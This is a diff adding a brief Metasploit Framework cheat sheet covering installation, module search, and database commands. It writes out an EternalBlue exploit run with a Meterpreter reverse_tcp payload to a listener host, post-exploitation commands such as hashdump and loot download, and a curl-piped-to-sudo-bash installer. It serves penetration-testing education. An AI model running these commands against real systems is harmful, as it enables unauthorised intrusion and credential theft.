@@ -1,0 +1,67 @@
+ Metasploit Framework
+
+1. Overview
+Metasploit Framework is one of the most powerful and widely used exploitation platforms.  
+It provides exploits, payloads, auxiliary modules, post-exploitation tools, and an environment for writing custom modules.
+Used in:
+- Penetration testing  
+- Red teaming  
+- Exploit development  
+- Post-exploitation & privilege escalation  
+
+---
+
+2. Key Features
+- 2000+ exploits  
+- Meterpreter shells  
+- Post-exploitation modules  
+- Auxiliary scanning modules  
+- Payload generation  
+- Database integration  
+- Support for writing custom modules  
+
+---
+
+3. Installation
+
+Kali Linux (pre-installed)
+sudo apt update
+sudo apt install metasploit-framework
+Ubuntu / Debian
+curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sudo bash
+
+Windows
+Download installer:
+https://www.metasploit.com/download
+
+---
+
+4. Starting Metasploit
+msfconsole
+
+---
+
+5. Common Commands
+Searching
+search smb
+search type:exploit apache
+
+Using a module
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+run
+
+Post-Exploitation Meterpreter
+sysinfo
+hashdump
+upload file.txt
+download loot.txt
+shell
+
+Database Integration
+msfdb init
+hosts
+services
+vulns
